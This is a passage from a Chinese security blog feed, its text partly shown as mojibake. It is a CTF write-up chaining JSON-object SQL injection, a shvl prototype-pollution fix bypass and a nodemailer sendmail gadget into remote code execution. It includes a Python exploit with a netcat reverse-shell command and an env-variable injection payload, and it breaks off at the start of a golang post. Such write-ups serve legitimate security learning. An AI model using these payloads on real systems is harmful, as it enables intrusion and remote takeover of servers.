        <content type="html"><![CDATA[<p>å‘¨æœ«è¿›è¡Œçš„d^3CTFåŸæœ¬è‡ªå·±æ˜¯æ²¡å‚åŠ çš„ã€‚ä¸è¿‡å› ä¸ºè¢«é—®åˆ°äº†å…¶ä¸­ä¸€é“é¢˜ç›®æ‰€ä»¥å°±åšäº†ä¸‹, å¤§æ¦‚èŠ±äº†2ä¸ªå°æ—¶ã€‚é¢˜ç›®éš¾åº¦è™½ç„¶ä¸­ç­‰ï¼Œä¸è¿‡ä¸ªäººè®¤ä¸ºå…¶åˆ©ç”¨é“¾çš„ç»„æˆéƒ½æ˜¯æ¯”è¾ƒç»å…¸çš„æ¼æ´ã€‚è¿™é‡Œåˆ†äº«ä¸‹è‡ªå·±çš„åšé¢˜æ€è·¯</p><a id="more"></a><h2 id="analysis"><a href="#analysis" class="headerlink" title="analysis"></a>analysis</h2><p>é¦–å…ˆæ‹¿åˆ°æºç åˆ†æä¸‹ã€‚å¹¶ä¸åƒç®€å•çš„nodejsé¢˜ç›®å­˜åœ¨æ˜¾çœ¼çš„æ¼æ´åˆ©ç”¨ç‚¹ã€‚ä½†æ˜¯æœ‰ä¸€äº›åœ°æ–¹æ˜¯æ‹¥æœ‰express å¼€å‘ç»éªŒçš„å°ä¼™ä¼´ç»ä¸èƒ½ç–å¿½æ‰çš„</p><p><img src="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_511d891830c1af317f68cad89595d906.png" class="lazyload" data-srcset="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_511d891830c1af317f68cad89595d906.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>è¿™é‡Œç”¨çš„æ˜¯æ²¡æœ‰<code>å±•å¼€</code>çš„postæ•°æ®ä¸­é—´ä»¶ä¸jsonä¸­é—´ä»¶ã€‚è¿™æ„å‘³ç€å½“æˆ‘ä»¬å‘é€jsonæ•°æ®æ—¶,å¯ä»¥ä¼ å…¥æ•°ç»„/å¯¹è±¡ã€‚</p><p>æˆ‘ä»¬æ¥ä¸‹æ¥ç»§ç»­çœ‹é¢˜ç›®æ€è·¯ã€‚</p><p>è®¿é—®adminè·¯ç”±éœ€è¦<code>req.session.username</code> ä¸º admin. ä¹‹ååœ¨adminè·¯ç”±å¤„è°ƒç”¨äº†ä¸€ä¸ªéå¸¸æ˜¾çœ¼çš„èµ‹å€¼æ“ä½œã€‚æœ€åå°†æˆ‘ä»¬çš„æ•°æ®é€šè¿‡<code>nodemailer</code>ä¸­çš„<code>sendMail</code>å‘é€é‚®ä»¶ã€‚</p><p>æ—¢ç„¶éœ€è¦session ä¸ºadmin , æˆ‘ä»¬å°±è¦ä½œä¸ºadmin ç™»å½•ã€‚æˆ‘ä»¬æ¥çœ‹ç™»å½•sqlè¯­å¥çš„æ“ä½œã€‚</p><pre><code class="javascript"> sql.query(&quot;SELECT * FROM users WHERE username = ? AND password = ?&quot;,[username, password],function (err, res) {     ...... }</code></pre><p>å¾ˆå¥‡æ€ªã€‚è™½ç„¶æ²¡æœ‰å­—ç¬¦æ‹¼æ¥,ä½†ä¹Ÿæ²¡æœ‰ç”¨å¸¸è§„çš„å ä½ç¬¦å¤„ç†ã€‚ä¼ å…¥çš„å‚æ•°æ˜¯ä¸€ä¸ªæ•°ç»„ã€‚æˆ‘ä»¬æ¥çœ‹å®˜æ–¹æ–‡æ¡£å¯¹è¿™ç§æƒ…å†µçš„å¤„ç†ã€‚<br><img src="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_f8b8316687168c885a30ded874c17969.png" class="lazyload" data-srcset="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_f8b8316687168c885a30ded874c17969.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>å¯ä»¥çœ‹å‡ºè¿™æ˜¯ä¸€ç§è½¬ä¹‰å­—ç¬¦çš„ç”¨æ³•ã€‚ä½†æ˜¯æ³¨æ„æ­¤å¤„å¹¶æ²¡æœ‰é™åˆ¶ä¼ å…¥å‚æ•°åªèƒ½ä¸ºå­—ç¬¦ã€‚è¿˜è®°å¾—ä¸Šé¢jsonä¸­é—´ä»¶çš„å­˜åœ¨å—ï¼Œæˆ‘ä»¬å½“ç„¶å¯ä»¥ç›´æ¥ä¼ å…¥å¯¹è±¡/æ•°ç»„,è€Œmysqlä¾èµ–å¯¹äºè¿™ç§æƒ…å†µçš„å¤„ç†æ˜¯å–œé—»ä¹è§çš„ï¼š<br><img src="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_9ac74cc0a7c888a5b8df57c73c74ae21.png" class="lazyload" data-srcset="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_9ac74cc0a7c888a5b8df57c73c74ae21.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æ­¤å¤„çš„é”®å€¼ä¼šè¢«å±•å¼€ï¼Œé‚£æˆ‘ä»¬è‡ªç„¶å¯ä»¥ç›´æ¥æ„é€ ä¸€ä¸ªçœŸå€¼çš„ç™»å½•è¯­å¥</p><pre><code class="sql">SELECT * FROM users WHERE username = &#39;admin&#39; AND password = `password` =1</code></pre><p>çœ‹åˆ°ç™»å½•è·¯ç”±å¹¶æ²¡æœ‰è¯­å¥åˆ¤æ–­ä¼ å…¥å‚æ•°æ˜¯å¦åªä¸ºå­—ç¬¦ä¸²ï¼Œæ‰€ä»¥å°±å¯ä»¥ç”¨<code>{&quot;username&quot;:&quot;admin&quot;, &quot;password&quot;: {&quot;password&quot;: &quot;1&quot;}}</code> æˆåŠŸç™»å½•,æ¥åˆ°adminè·¯ç”±ã€‚</p><p>ps: ä¹‹å‰å‡ºNCTF çš„nosqlæ³¨å…¥æ—¶å°±æ›¾å¼ºè°ƒè¿‡,ä¼ å‚ä¸€å®šè¦æ£€æŸ¥ç±»å‹ã€‚è¿™ä¸¤å¤„éƒ½æ˜¯å› ä¸ºå…è®¸jsonæ•°æ®ä¼ å…¥å¯¹è±¡å¯¼è‡´æ³¨å…¥çš„å…¸å‹ã€‚ä¹Ÿæ˜¯è€åˆ°æ‰ç‰™çš„é—®é¢˜äº†ã€‚</p><h2 id="prototype-pollution-to-RCE"><a href="#prototype-pollution-to-RCE" class="headerlink" title="prototype pollution to RCE"></a>prototype pollution to RCE</h2><p>  æ¥ä¸‹æ¥æˆ‘æŠŠé‡å¿ƒæ”¾åœ¨adminæ§åˆ¶å™¨é‚£éå¸¸æ˜¾çœ¼çš„ä»£ç é‚£ï¼Œ</p><pre><code class="javascript">let contents = {};Object.keys(req.body).forEach((key) =&gt; {  shvl.set(contents, key, req.body[key]);});contents.from = &#39;&quot;admin&quot; &lt;admin@8-bit.pub&gt;&#39;;</code></pre><p>ç†Ÿæ‚‰node æ¼æ´çš„åº”è¯¥ä¸€çœ¼å°±èƒ½çœ‹å‡ºæ¥è¿™é‡Œå¯èƒ½å­˜åœ¨åŸå‹é“¾æ±¡æŸ“æ¼æ´ã€‚<br>ï¼ˆä¸ç›´æ¥ä¼ å€¼éè¦éå†å¯æ§jsonæ•°æ®çš„keys,å¤ªæ˜æ˜¾äº†ã€‚ã€‚ã€‚ï¼‰</p><p>ä¸Šgithubæœç´¢ä¸‹shvlä¼šå‘ç°è¿™æ˜¯ä¸€ä¸ªstar è¿100éƒ½ä¸åˆ°çš„ä¾èµ–ã€‚å¦‚æœå…³æ³¨è¿‡hackeroneä¸Šnode ç¬¬ä¸‰æ–¹ä¾èµ–æ¼æ´çš„è¯ï¼Œå°±ä¼šç•™æ„åˆ°ä¸Šé¢æœ‰å¾ˆå¤šéå¸¸å†·é—¨çš„ä¾èµ–çš„åŸå‹é“¾æ±¡æŸ“æ¼æ´ã€‚è¿™äº›ä¾èµ–å¤§å¤šä½¿ç”¨é‡å°‘ï¼Œä»¥è‡³äºå¼€å‘è€…æœ‰æ—¶ä¹Ÿæ‡’å¾—ä¿®ã€‚å®˜æ–¹ä¹Ÿä¸ä¼šæ³¨é‡å…¶å®‰å…¨æ€§(æ‰€ä»¥å¼€å‘ä¸­è¿˜æ˜¯ç”¨ä½¿ç”¨é‡å¤šçš„ä¾èµ–2333)</p><p>æŒ‰ç…§è¿™ä¸ªæ€è·¯æœç´¢<code>shvl prototype pollution</code>ä¸éš¾å‘ç°</p><p><a href="https://snyk.io/vuln/SNYK-JS-SHVL-1054936" target="_blank" rel="noopener">https://snyk.io/vuln/SNYK-JS-SHVL-1054936</a> </p><p>çš„ç¡®å­˜åœ¨æ±¡æŸ“æ¼æ´ã€‚ä¸è¿‡è²Œä¼¼ç°åœ¨ç‰ˆæœ¬å·²ç»ä¿®å¤äº†ã€‚æˆ‘ä»¬æ¥çœ‹çœ‹ä¿®å¤ä»£ç </p><pre><code class="javascript">export function set  (object, path, val, obj) {  return !/__proto__/.test(path) &amp;&amp; ((path = path.split ? path.split(&#39;.&#39;) : path.slice(0)).slice(0, -1).reduce(function (obj, p) {    return obj[p] = obj[p] || {};  }, obj = object)[path.pop()] = val), object;};</code></pre><p>æ­¤å¤„æ¯”è¾ƒå°´å°¬çš„æ˜¯ï¼Œä½œè€…ä¿®å¤çš„æ–¹å¼åªæ˜¯å•çº¯çš„æ£€æŸ¥ <code>path</code> æ˜¯å¦å«<code>__proto__</code>. ç„¶è€Œå®ƒèµ‹å€¼çš„æ–¹æ³•æ˜¯é€šè¿‡å¾ªç¯å¯¹è±¡èµ‹å€¼çš„ã€‚ç»•è¿‡æ–¹æ³•å¤ªå¸¸è§äº†ã€‚<code>constructor.prototype</code>å³å¯</p><p>poc</p><pre><code class="javascript">const shvl = require(&#39;shvl&#39;); var obj = {} console.log(&quot;Before : &quot; + obj.isAdmin); shvl.set(obj, &#39;constructor.prototype.isAdmin&#39;, true);console.log(&quot;After : &quot; + obj.isAdmin);console.log(Object.prototype);/*Before : undefinedAfter : true[Object: null prototype] { isAdmin: true }*/</code></pre><p>è¿™é‡Œå¯ä»¥çœ‹åˆ°æˆ‘ä»¬å·²ç»æ±¡æŸ“åˆ°åŸºç±»åŸå‹çš„ä»»æ„å±æ€§ä¸Šäº†,è¿™å¯ä»¥ç®—æ˜¯éå¸¸å¼ºå¤§çš„ã€‚å‡å¦‚é¢˜ç›®ç”¨äº†æ¨¡æ¿å¼•æ“åŸºæœ¬ä¸Šå°±ç»“æŸç›´æ¥RCEäº†ã€‚ä¸è¿‡æ˜¾ç„¶ï¼Œé¢˜ç›®çš„nodemailerè¿˜æ²¡æœ‰ç”¨åˆ°ã€‚æˆ‘ä»¬å…ˆæ¥çœ‹ä¸‹nodemailerçš„å†å²æ¼æ´</p><p>å¾ˆå¿«æˆ‘ä»¬å°±èƒ½æ‰¾åˆ°<br><a href="https://snyk.io/vuln/SNYK-JS-NODEMAILER-1038834" target="_blank" rel="noopener">https://snyk.io/vuln/SNYK-JS-NODEMAILER-1038834</a><br>è¿™é‡Œçš„å‘½ä»¤æ³¨å…¥æ¼æ´ã€‚æ¥çœ‹ä¸‹å…³é”®ä»£ç </p><p>nodemailer\lib\sendmail-transport\index.js<br>ä¸­ , SendmailTransport ç±»çš„send æ–¹æ³•<br><img src="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_e5d1ceaee1bb4a6f64015380340c71e8.png" class="lazyload" data-srcset="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_e5d1ceaee1bb4a6f64015380340c71e8.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>è¿™é‡Œå‘½ä»¤æ³¨å…¥çš„åŸç†æ˜¯ï¼Œargså‚æ•°<code>-i</code>ä¸é»˜è®¤ä¸ºç©ºçš„<code>this.args</code>ä¸å¯æ§çš„<code>envelope.to</code>æ‹¼æ¥äº†ã€‚è¿™å°±å¯¼è‡´æˆ‘ä»¬å¯ä»¥é¢å¤–å¡å…¥å…¶ä»–å‚æ•°ã€‚åšåˆ°å‚æ•°æ³¨å…¥,åƒ<code>-Dfilename@example.com (Debug output ffile)</code></p><p>ç„¶å,ä¸‹é¢è°ƒç”¨äº†ä¸€ä¸ª_spawn,å…¶å®å°±æ˜¯<code>spawn(sendmail,args)</code>ã€‚å¦‚æœè¯´phpé‡Œå¤§å®¶æœ€å…ˆä¼šå»æ‰¾çš„æ¶æ„å‡½æ•°æ˜¯<code>system,exec</code>ç­‰oså‡½æ•°ï¼Œnodejsä¸­ç›¸å¯¹åº”çš„è‚¯å®šå°±æ˜¯<code>spawn,execSync</code>è¿™æ ·çš„äº†(å…¶å®éƒ½æ˜¯è°ƒç”¨çš„spawn),æ›´ä¸ç”¨è¯´,åŸºç±»æ±¡æŸ“ + child_process = RCE.</p><p>æ—¢ç„¶è¿™é‡Œæœ‰å­è¿›ç¨‹å‡½æ•°ã€‚æˆ‘ä»¬åˆæœ‰ä»»æ„é“¾ä¸Šçš„æ±¡æŸ“,è¿™æ ·å°±æœ‰ä¸¤ç§æ–¹å¼RCEäº†ã€‚ä¸€ä¸ªæœ´ç´ çš„æƒ³æ³•å°±æ˜¯ç®€å•æ£€æŸ¥ä¸‹çœ‹çœ‹å…¶å­è¿›ç¨‹å‡½æ•°å‚æ•°æ˜¯å¦å¯æ§ã€‚</p><p>åˆ†äº«ä¸€ä¸ªéå¸¸å¸¸è§çš„å°æŠ€å·§ï¼Œè¦çŸ¥é“è¿™ä¸ªå±æ€§æ˜¯ä¸æ˜¯ä¼šå—åˆ°é“¾ä¸Šæ±¡æŸ“çš„å½±å“ï¼Œç›´æ¥çœ‹ä»£ç ç»“æ„å°±å¥½äº†<br><img src="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_25ae990dedc37a7e21849968339fcad6.png" class="lazyload" data-srcset="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_25ae990dedc37a7e21849968339fcad6.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>åŸºæœ¬ä¸Šå‡ºç°<code>if(xxx.xxx)</code>è¿™æ ·è¯­å¥çš„,å®ƒç”¨æ¥åˆ¤æ–­çš„å±æ€§å¤šåŠæ˜¯æ²¡æœ‰é¢„å…ˆèµ‹å€¼çš„ã€‚æ‰€ä»¥æ‰ä¼šé€šè¿‡ifæ¥åˆ¤æ–­æ˜¯å¦æœ‰å€¼,æ¥å†™æ¡ä»¶è¯­å¥ã€‚è€Œè¿™äº›å±æ€§åŸºæœ¬éƒ½æ˜¯å¯æ±¡æŸ“çš„ã€‚æ­£å› å¦‚æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥åšåˆ°æ±¡æŸ“<code>options.args</code> ä¸<code>options.path</code>.ç­‰äºæ˜¯å®Œå…¨æ§åˆ¶äº†spawnçš„å‚æ•°ã€‚</p><p>spawnçš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯command,ç¬¬äºŒä¸ªæ˜¯æ•°ç»„æ¥æ”¶ command-line argumentsã€‚æˆ‘ä»¬å¯ä»¥ç”¨<code>/bin/sh -c &quot;xxx&quot;</code>æ‰§è¡Œä»»æ„å‘½ä»¤</p><p>é‚£ä¹ˆé¢˜ç›®ä¸­çš„sendmailä¼šä¸ä¼šé»˜è®¤èµ°åˆ°è¿™é‡Œå‘¢ï¼Ÿæˆ‘ä»¬çœ‹ä¸‹mail.jsä¸­<code>nodemailer.createTransport</code>çš„ä»£ç </p><p><img src="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_aafe8f0bc20b3da6976a4fd16fcfe6c0.png" class="lazyload" data-srcset="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_aafe8f0bc20b3da6976a4fd16fcfe6c0.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æ˜¾ç„¶éœ€è¦optionsä¸­è®¾ç½® sendmail ä¸ºtrue,æˆ‘ä»¬çš„<code>transporter</code>æ‰ä¼šæ˜¯<code>SendmailTransport</code>. è¿™é‡Œè·Ÿä¸Šé¢æ˜¯ä¸€æ ·çš„é“ç†ï¼Œæˆ‘ä»¬ç›´æ¥æ±¡æŸ“ sendmail å±æ€§å³å¯</p><p>æ¥ä¸‹æ¥å°±å¾ˆè½»æ¾äº†</p><h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><p>  æ–¹ä¾¿è°ƒè¯•èµ·è§ï¼Œæˆ‘ä»¬å…ˆæœ¬åœ°èµ·ä¸€ä¸‹ä»£ç ã€‚è¿™é‡Œéƒ½å¾ˆå¥½é…ç½®ï¼Œç¨å¾®éœ€è¦æ³¨æ„çš„æ˜¯smtpæœåŠ¡å™¨çš„è®¾ç½®ã€‚æˆ‘ä»¬ç›´æ¥çœ‹å®˜æ–¹æ–‡æ¡£ <a href="https://nodemailer.com/about/" target="_blank" rel="noopener">https://nodemailer.com/about/</a> æŒ‰ç…§å®˜æ–¹çš„é…ç½®ç›´æ¥<a href="https://ethereal.email/create" target="_blank" rel="noopener">https://nodemailer.com/about/</a> åˆ›ç«‹ä¸€ä¸ªè´¦æˆ·ã€‚å°±å¯ä»¥è·‘èµ·æ¥äº†</p><p>ç„¶åæŒ‰ç…§ä¸Šé¢çš„åˆ©ç”¨é“¾,å†™expæ‰“ä¸€ä¸‹ï¼Œæœ¬åœ°å¾ˆå¿«é€šäº†ï¼Œè¿œç¨‹çš„è¯æ‰¾äº†ä¸‹åªèƒ½ncå¼¹shellæ¯”è¾ƒæ–¹ä¾¿ã€‚</p><pre><code class="python">import requestss = requests.session()r = s.post(&#39;http://ce775e2992.8bit-pub.d3ctf.io/user/signin&#39;, json={    &#39;username&#39;: &#39;admin&#39;,    &#39;password&#39;: {        &#39;password&#39;: 1    }},    cookies={    &#39;session&#39;: &#39;s%3Asis-4wQQfN9QjaqEJAhBIL4iPP_e-qnr.p1CqQc3RiekkFz5FYzBRR9%2BO3j%2FIUX0vPh2sdkcuMk8&#39;})print(r.json())r = s.post(&#39;http://ce775e2992.8bit-pub.d3ctf.io/admin/email&#39;, json={    &#39;from&#39;: &quot;admin@123.com&quot;,    &#39;to&#39;: &#39;j3c9g.tls@inbox.testmail.app&#39;,    &#39;contents&#39;: &quot;bycbycbyc&quot;,    &quot;constructor.prototype.sendmail&quot;: True,    &quot;constructor.prototype.path&quot;: &quot;/bin/sh&quot;,    &quot;constructor.prototype.args&quot;: [&quot;-c&quot;, &quot;nc xxx 9001 -e /bin/sh&quot;],}, cookies={    &#39;session&#39;: &quot;s%3Asis-4wQQfN9QjaqEJAhBIL4iPP_e-qnr.p1CqQc3RiekkFz5FYzBRR9%2BO3j%2FIUX0vPh2sdkcuMk8&quot;})print(r.json())</code></pre><p>å½“ç„¶ã€‚å¦‚æœä¸æƒ³æ‰¾æ±¡æŸ“åˆ°rceçš„å±æ€§æ—¶ï¼Œè¿˜æœ‰ä¸€ä¸ªé€šæ³•ã€‚å°±æ˜¯æˆ‘åœ¨NCTF2020 ä¸­å‡ºçš„<a href="https://github.com/baiyecha404/My-NCTF2020-Challs/tree/master/PackageManager_v2.0" target="_blank" rel="noopener">packagemanager_v2.0 </a> é‡Œçš„åˆ©ç”¨</p><p>å½“æ—¶æåˆ°è¿‡äº†ã€‚åˆ°åŸºç±»çš„æ±¡æŸ“+ ä»»æ„å­è¿›ç¨‹ = RCEã€‚è¿™é‡Œæ— è„‘ç›´æ¥æ±¡æŸ“ç¯å¢ƒå˜é‡å½“ç„¶æ˜¯å¯ä»¥çš„</p><p>æ”¹ä¸‹å°±è¡Œ</p><pre><code class="javascript">&quot;constructor.prototype.sendmail&quot;: True,&quot;constructor.prototype.shell&quot;:&quot;node&quot;,&quot;constructor.prototype.env.NODE_DEBUG&quot;: &quot;require(&#39;child_process&#39;).execSync(&#39;curl 127.0.0.1&#39;);process.exit();//&quot;,&quot;constructor.prototype.env.NODE_OPTIONS&quot;:&quot;-r /proc/self/environ&quot;,</code></pre><p><img src="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_790c9ee4c7ba0655f6129ea9eadb61bd.png" class="lazyload" data-srcset="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_790c9ee4c7ba0655f6129ea9eadb61bd.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>è¿œç¨‹ncæ‰“é€š<br><img src="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_09312849190b675cac32392d97e0db1c.png" class="lazyload" data-srcset="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_09312849190b675cac32392d97e0db1c.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>ç”±äºé¢˜ç›®æ‰“ä¸€æ¬¡åæ•°æ®åº“å°±ä¼šæŠ¥é”™,åªè¦å®Œæˆç¬¬ä¸€æ­¥ä»¥adminç™»å½•çš„é€‰æ‰‹åº”è¯¥éƒ½èƒ½åœ¨ç™»å½•æ—¶çœ‹åˆ°ä»–äººçš„payloadã€‚æ‰€ä»¥å¯èƒ½ä¼šæœ‰è¹­è½¦ã€‚</p><h2 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h2><p>æ€»çš„æ¥è¯´è¿™é“é¢˜éš¾åº¦ä¸€èˆ¬ã€‚ä½†æ˜¯åˆ©ç”¨ç‚¹å…¶å®éƒ½æ˜¯æ¯”è¾ƒç»å…¸çš„ã€‚æ‰€ä»¥å€¼å¾—åˆ†äº«ä¸€ä¸‹ã€‚ä¹Ÿæé†’æˆ‘ä»¬ä»å¼€å‘çš„è§’åº¦ä¸Šï¼Œä¸€æ–¹é¢åœ¨æ‰“å¼€äº†jsonä¸­é—´ä»¶æˆ–è€…<code>{extendedï¼š true}</code>çš„æƒ…å†µä¸‹ä¸€å®šè¦æ³¨æ„ä¼ å‚ç±»å‹ã€‚å¦ä¸€æ–¹é¢ä¹Ÿæ˜¯é¿å…ä½¿ç”¨ç”¨é‡ä½çš„nodeä¾èµ–,å¦åˆ™å¯èƒ½ä¼šå­˜åœ¨ä¸€äº›æœªä¿®å¤å®Œå…¨æˆ–è€…ç”šè‡³æ ¹æœ¬ä¸ä¿®å¤çš„ä»£ç ã€‚æ¯”å¦‚ æ­¤å¤„æ²¡ä¿®å¤å®Œå…¨çš„shvl çš„æƒ…å½¢ç”šè‡³éƒ½ä¸æ˜¯ä¸ªä¾‹ã€‚ä¹‹å‰ posixæŒ–åˆ°çš„flat ä¾èµ– åŸå‹é“¾æ±¡æŸ“ç¬¬ä¸€æ¬¡ä¿®å¤çš„ç‰ˆæœ¬è·Ÿè¿™é‡Œå‡ºç°äº†å‡ ä¹ä¸€æ ·çš„é—®é¢˜,å¯¼è‡´å¯ä»¥<code>prototype</code>ç»•è¿‡ã€‚ã€‚ã€‚</p><p>æœ€åå°±æ˜¯å…³äºRCEã€‚ nodejsé‡Œæƒ³å€Ÿç”±æ¼æ´è¾¾æˆRCEç¡®å®ä¸æ˜¯ä¸€ä»¶ç®€å•çš„äº‹æƒ…ï¼ŒåŸºæœ¬ä¸Šå°±å‚æ•°æ³¨å…¥ï¼Œæˆ–è€…åŸå‹é“¾æ±¡æŸ“ + gadget/ AST injection. è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆåŸå‹é“¾æ±¡æŸ“å§‹ç»ˆæ˜¯nodejsæ¼æ´çƒ­é—¨çš„åŸå› ã€‚ ä¹‹å‰æ³¨æ„åˆ°posixä»–ä»¬å·²ç»ç ”ç©¶å‡ºäº†è‡ªåŠ¨æŒ–æ˜åŸå‹é“¾æ±¡æŸ“çš„å·¥å…·äº†,å±å®ç¾¡æ…•ã€‚ã€‚ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> wp </tag>
            
            <tag> Node.js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>golangçš„ä¸€äº›å®‰å…¨é—®é¢˜</title>
      <link href="2021/02/07/golang%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/"/>
      <url>2021/02/07/golang%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>å¯’å‡ä¸»è¦æ˜¯å…ˆå‡ºå®Œäº†ä¹‹å‰å¿ƒå¿ƒå¿µå¿µçš„typescript é¢˜ç›®ï¼Œä¹‹åä¸»è¦æ˜¯æŠ½ç‚¹æ—¶é—´å­¦golang.åŒå­¦æ¨èçš„ä»“åº“è®²çš„è¿˜æ˜¯å¾ˆä¸é”™çš„</p><p><a href="https://github.com/unknwon/the-way-to-go_ZH_CN" target="_blank" rel="noopener">https://github.com/unknwon/the-way-to-go_ZH_CN</a></p><p>ä»ç®€å•çš„å¼€å‘ä¸å­¦ä¹ è¿‡ç¨‹ä¸­å¯ä»¥æ„Ÿè§‰åˆ°golangçš„ç¡®éå¸¸å®‰å…¨ï¼Œå¾ˆå¤šé—®é¢˜ç”±äºä½œä¸ºå¼ºç±»å‹çš„é™æ€è¯­è¨€ï¼Œä»ç¼–è¯‘è¿‡ç¨‹å°±èƒ½é˜²æ­¢ä¸å®‰å…¨çš„æ“ä½œã€‚å› æ­¤å¤§éƒ¨åˆ†æ¼æ´äº§ç”Ÿè¿˜æ˜¯å½’ç»“äºä¾èµ–åº“ï¼ˆé€šå¸¸å·²ç»å‘å±•ä¸ºCVEæˆ–è€…issueï¼‰ä»¥åŠå¼€å‘è€…è‡ªèº«çš„æ“ä½œæ¼æ´ã€‚è¿™é‡Œå°±ä½œä¸ºå°ç»“,ç®€å•è°ˆä¸€è°ˆ</p><a id="more"></a><h2 id="interger-overflow-truncation"><a href="#interger-overflow-truncation" class="headerlink" title="interger overflow/truncation"></a>interger overflow/truncation</h2><p>golang å­˜åœ¨éå¸¸ç»å…¸çš„æ•´æ•°åè½¬/æº¢å‡ºé—®é¢˜</p><p>å¯¹æ— ç¬¦å·æ•°çš„åè½¬</p><pre><code class="go">func main() {    var a uint32 = 2147483648    var b uint32 = 2147483648    var sum  =  a + b    fmt.Println(reflect.TypeOf(sum))    fmt.Printf(&quot;Sum is : %d&quot;,sum)}//uint32//Sum is : 0</code></pre><p>æƒ³è¦ç›´æ¥å£°æ˜ä¸€ä¸ªå¤§å°å·²ç»æº¢å‡ºçš„æ•°è‡ªç„¶ä¸ä¼šé€šè¿‡ç¼–è¯‘ï¼Œå› æ­¤å‡ºç°åè½¬çš„è¯ï¼Œä¸»è¦æ˜¯åœ¨å˜é‡çš„ç›¸åŠ è¿™æ ·çš„è®¡ç®—æ‰ä¼šä¼šå¯¼è‡´æ ‡å¿—CFä½åè½¬</p><p>æœ‰ç¬¦å·æ•°çš„æº¢å‡º</p><pre><code class="go">var a int8 = 127var b int8 = 1var sum int8 =  a + bfmt.Println(reflect.TypeOf(sum))fmt.Printf(&quot;Sum is : %d&quot;,sum)//int8//-128</code></pre><p>å…·ä½“çš„å€¼å¯ä»¥çœ‹åˆ°mathåŒ…ä¸­çš„å¸¸é‡å®šä¹‰ã€‚<br><img 